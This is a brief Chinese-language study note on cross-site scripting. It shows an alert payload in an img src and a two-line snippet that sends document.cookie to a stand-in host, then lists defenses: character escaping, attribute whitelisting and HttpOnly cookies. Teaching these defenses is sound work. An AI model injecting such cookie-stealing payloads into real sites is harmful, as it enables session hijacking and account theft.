## XSS(Cross Site Scripting)
往页面中插入js代码，比如发表文章的时候往img标签的src内写入javascript:alert('xss'),这样文章发表后就会出现弹窗
类似的有script、iframe、style标签等
var img = document.createElement('img');  
img.src='http://www.xss.com?cookie='+document.cookie;  

## 防护措施：
1. 作为标签：在不需要html输入的地方对html标签及一些特殊字符（" < > &）做过滤，将其转化为不被浏览器解释执行的字符：（&nbsp; &lt;）
2. 作为某标签的属性：属性本身存在的 单引号和双引号都需要进行转码，对用户输入的html 标签及标签属性做白名单过滤，也可以对一些存在漏洞的标签和属性进行专门过滤。
3. 设置cookie的http-only字段为true，就不能通过js获取cookie